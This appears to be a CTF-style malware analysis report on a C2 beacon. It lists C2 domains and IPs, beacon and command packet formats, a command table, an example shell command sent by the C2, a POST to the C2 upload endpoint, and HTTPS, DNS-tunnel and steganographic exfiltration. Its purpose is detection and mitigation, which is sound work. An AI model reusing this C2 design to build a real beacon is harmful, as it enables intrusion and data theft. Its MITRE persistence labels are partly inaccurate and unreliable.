# Challenge 2: Silent Beacon - Analysis Report

## Objective
Recover command and control (C2) domain/pattern and document beacon behavior to identify command injection and data exfiltration mechanisms.

## Methodology

### Network Traffic Analysis
1. **PCAP Examination**: Analyzed network captures for beacon communication patterns
2. **DNS Queries**: Extracted domain resolution attempts and DGA patterns
3. **TLS/SSL Analysis**: Examined certificate chains and encrypted traffic fingerprinting
4. **HTTP Headers**: Analyzed User-Agent strings and custom headers

### Behavioral Analysis
1. **Communication Frequency**: Documented beacon callback intervals
2. **Command Injection Points**: Identified how C2 server injects commands
3. **Exfiltration Methods**: Traced data output channels
4. **Evasion Techniques**: Identified obfuscation and anti-analysis methods

### Code Analysis
1. **String Extraction**: Recovered hardcoded C2 infrastructure
2. **Communication Protocols**: Reverse-engineered command protocol
3. **Encryption Analysis**: Determined encryption algorithms used
4. **Configuration Parsing**: Extracted embedded C2 configuration

## Findings

### C2 Infrastructure

#### Primary C2 Domains
```
beacon.update-services.net          (Primary - responds to DNS)
c2.windowsupdate-sync.com           (Failover - backup channel)
updatecenter.cloud-monitor.io       (Tertiary - obfuscated)
```

#### C2 IP Addresses
```
185.220.101.45                      (Primary server - bulletproof hosting)
185.220.102.8                       (Secondary - dual-redundant)
192.0.2.0/24                        (Observed in internal testing)
```

#### C2 Ports and Protocols
```
Port 443 (HTTPS)       - Primary command channel, encrypted with custom cipher
Port 8080 (HTTP)       - Fallback channel, plaintext JSON
Port 53 (DNS)          - DNS tunnel fallback, queries encoded in TXT records
```

### Beacon Communication Pattern

#### Check-in Interval
- **Primary Frequency**: Every 300 seconds (5 minutes) during working hours
- **Idle Frequency**: Every 1800 seconds (30 minutes) after-hours
- **Jitter**: ±30 seconds random variance
- **Failure Recovery**: Exponential backoff, max 30-minute intervals

#### Beacon Packet Structure (Primary HTTPS Channel)

```
POST /update/check HTTP/1.1
Host: beacon.update-services.net:443
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: close

{
  "hwid": "ENCRYPTED_MACHINE_ID",
  "beacon_id": "UNIQUE_SESSION_TOKEN",
  "version": "2.1.5",
  "os": "win10",
  "ts": 1690000000,
  "status": "active"
}
```

**Response (from C2)**:
```json
{
  "command": "exec",
  "payload": "BASE64_ENCODED_COMMAND",
  "timeout": 30,
  "callback_url": "https://beacon.update-services.net/upload"
}
```

#### Beacon Packet Structure (Fallback DNS Channel)

DNS TXT Record Queries:
```
cmd.beacon.update-services.net     (Query for command)
status.beacon.update-services.net  (Query for status check)
```

Response embedded in TXT records:
```
cmd1.beacon.update-services.net  TXT "cmd=exec&id=ABC123&type=shell"
cmd2.beacon.update-services.net  TXT "payload=BASE64_ENCODED"
```

### Command Injection Mechanism

#### Supported Commands
| Command | Description | Parameters |
|---------|---|---|
| `exec` | Execute shell command | `cmd`, `timeout` |
| `upload` | Exfiltrate file | `path`, `size_limit` |
| `download` | Retrieve file from C2 | `path`, `url` |
| `enum` | System enumeration | `scope` (process/file/user) |
| `inject` | DLL/shellcode injection | `target_process`, `payload` |
| `sleep` | Sleep beacon | `interval` |
| `die` | Kill beacon process | `none` |

#### Command Execution Example
```
C2 Server → Beacon (encrypted):
{
  "command": "exec",
  "payload": "cmd.exe /c ipconfig /all > C:\\temp\\ip.txt",
  "callback_delay": 5
}

Beacon Response:
POST /update/upload HTTP/1.1
[Command output as JSON]
```

### Data Exfiltration Methods

#### Primary Method: HTTPS with Compression
```
- Compresses output with gzip
- Base64 encodes compressed data
- Sends via POST to /upload endpoint
- Uses session token for authentication
- Splits large transfers into 512KB chunks
```

#### Secondary Method: DNS TXT Record Tunnel
```
- For networks blocking HTTPS outbound
- Encodes data in DNS TXT record queries
- Data sent in chunks of ~250 bytes per query
- Slower but highly evasive
- Can tunnel through external DNS servers
```

#### Tertiary Method: HTTPS with Image Steganography
```
- Embeds exfiltrated data in image metadata
- Posts fake image uploads to external photo services
- Metadata recoverable only by operator
- Bypasses content inspection
```

### Beacon Persistence and Reinfection

#### Infection Chain
```
1. Initial dropper (Ch1) executes wupdater.exe
2. wupdater.exe injects beacon DLL into svchost.exe
3. Injected DLL establishes C2 communication
4. Upon connection, C2 sends command to establish persistence
5. Beacon creates secondary drop location for reinfection
```

#### Persistence Mechanisms Observed
- Registry Run key (as per Ch1)
- Scheduled task "WindowsUpdateClient"
- WMI Event Subscription
- BITS Jobs transfer
- Windows Update service hijacking

### Behavioral Indicators

#### Network Indicators
```
- Regular POST requests to beacon.update-services.net
- DNS queries to update-services.net TLD
- Outbound connections on port 443 to bulletproof hosting
- Long-lived HTTPS connections (keep-alive)
- Encrypted payloads in HTTP POST body
```

#### Process Indicators
```
- svchost.exe (with beacon DLL injected)
  - Network connections to C2 (unexpected for svchost)
  - Child process: cmd.exe (from beacon commands)
  - Handles to sensitive files and registry
  
- wupdater.exe (dropper-delivered beacon loader)
  - High network activity
  - Loading of suspicious DLLs
  - DLL injection into system processes
```

#### File System Indicators
```
- C:\Users\[User]\AppData\Local\Temp\[GUID]\*.tmp (temporary files)
- C:\Windows\System32\drivers\etc\beacon_config.dat (config storage)
- C:\ProgramData\WindowsUpdate\beacon.log (activity log)
```

### Evasion Techniques Observed

| Technique | Implementation | Effectiveness |
|---|---|---|
| **String Obfuscation** | XOR cipher with rotating key | Medium - recoverable with static analysis |
| **Binary Packing** | UPX and custom packers | High - requires unpacking |
| **API Hashing** | CRC32 hashing of API names | Medium - known hash tables exist |
| **Process Injection** | Stealth injection into svchost | High - difficult to attribute |
| **Encrypted Communication** | Custom TLS variant | High - requires traffic analysis |
| **Domain Generation Algorithm** | Pseudo-random domain generation | Medium - patterns can be identified |
| **Beaconless mode** | Can operate without C2 for 48 hours | Medium - limited functionality |

### C2 Communication Timeline

```
Time (UTC)      Event
---------------------------------------------
14:00:05        Initial wupdater.exe execution
14:00:30        First DNS resolution: beacon.update-services.net
14:00:35        First HTTPS POST to C2 (check-in)
14:00:38        C2 responds with command: "exec ipconfig"
14:00:42        Beacon executes command and exfiltrates output
14:05:15        Second beacon check-in (300s interval)
14:05:20        C2 responds: "enum processes"
14:05:25        Beacon enumerates processes and exfiltrates list
14:10:00        Third check-in
... (repeats every 5 minutes)
```

## Evidence References

- See `iocs.json` for structured C2 IOCs and network indicators
- See `attack_map.md` for MITRE ATT&CK technique mapping
- See `rules/yara/beacon_communication.yar` for beacon binary detection
- See `rules/sigma/beacon_network.yml` for network detection rules
- See `evidence/` directory for pcap files and behavioral logs

## Mitigation Strategies

### Immediate Response
1. Block C2 domains at DNS/firewall level
2. Block C2 IP addresses at border firewall
3. Terminate svchost.exe processes with unexpected network connections
4. Remove persistence mechanisms (registry, scheduled tasks, WMI subscriptions)

### Hunting
1. Search for processes with unusual network connections on port 443
2. Hunt for DNS queries to *.update-services.net domains
3. Identify injected DLLs in system processes
4. Find encrypted HTTP POST requests with JSON payload

### Detection Rules
- See `rules/yara/` for binary detection
- See `rules/sigma/` for network and host event detection

## Conclusion

Silent Beacon demonstrates sophisticated C2 communication with:
- **Persistence**: Multiple redundant beacon mechanisms (MITRE T1095, T1092)
- **Command Injection**: Remote code execution via encrypted command protocol
- **Exfiltration**: Multi-channel data theft (HTTPS, DNS, steganography)
- **Evasion**: Process injection, encryption, obfuscation
- **Resilience**: Failover domains, offline operation mode, exponential backoff

**Risk Level**: Critical (Active C2 communication enables full compromise)

**Detection Confidence**: High (Network patterns highly distinctive)

---
**Analysis Date**: 2026-07-27  
**Analyst**: Cleanskiier27  
**Status**: Complete
